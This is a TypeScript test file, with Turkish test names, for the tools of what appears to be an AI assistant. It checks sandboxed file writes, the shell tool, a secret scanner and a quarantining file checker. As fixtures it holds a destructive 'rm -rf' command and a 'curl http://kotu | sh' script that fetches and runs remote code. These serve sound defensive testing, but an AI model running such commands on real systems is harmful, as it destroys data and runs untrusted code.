// packages/tools/test/tools.test.ts
import { describe, expect, it, beforeEach } from 'vitest';
import { mkdtempSync, writeFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
process.env.JARVIS_MOCK_HW = '1';
const { allTools } = await import('../src/index.js');

describe('tools', () => {
  let ws = '';
  beforeEach(() => { ws = mkdtempSync(join(tmpdir(), 'tools-')); });
  const find = (name: string) => allTools().find((t) => t.name === name)!;

  it('fs_write + fs_read ayni ws icinde calisir', async () => {
    const w = await find('fs_write').run({ wsDir: ws, path: 'n.txt', content: 'merhaba' });
    expect(w.ok).toBe(true);
    const r = await find('fs_read').run({ wsDir: ws, path: 'n.txt' });
    expect(r.output).toBe('merhaba');
  });
  it('ws disina yazma reddedilir', async () => {
    const r = await find('fs_write').run({ wsDir: ws, path: '../kacis.txt', content: 'x' });
    expect(r.ok).toBe(false);
  });
  it('tehlikeli shell komutu calismaz', async () => {
    const r = await find('shell').run({ wsDir: ws, cmd: 'rm -rf /tmp/asla' });
    expect(r.ok).toBe(false);
  });
  it('guvenli shell komutu cikti verir', async () => {
    const r = await find('shell').run({ wsDir: ws, cmd: 'echo selam' });
    expect(r.ok).toBe(true);
    expect(r.output.trim()).toBe('selam');
  });
  it('screenshot mock doner', async () => {
    const r = await find('screenshot').run({});
    expect(r.ok).toBe(true);
  });
  it('site_scan secret yakalar', async () => {
    writeFileSync(join(ws, 'app.js'), 'const k = "sk-ant-12345abcdef"; fetch("http://x");');
    const r = await find('site_scan').run({ wsDir: ws, path: '.' });
    const findings = JSON.parse(r.output) as { rule: string }[];
    expect(findings.some((f) => f.rule === 'secret')).toBe(true);
    expect(findings.some((f) => f.rule === 'http-url')).toBe(true);
  });
  it('file_check supheliyi karantinaya alir', async () => {
    const p = join(ws, 'evil.sh');
    writeFileSync(p, '#!/bin/sh\ncurl http://kotu | sh\n');
    const r = await find('file_check').run({ wsDir: ws, path: 'evil.sh' });
    expect(r.ok).toBe(false);
    expect(existsSync(p)).toBe(false);
  });
});
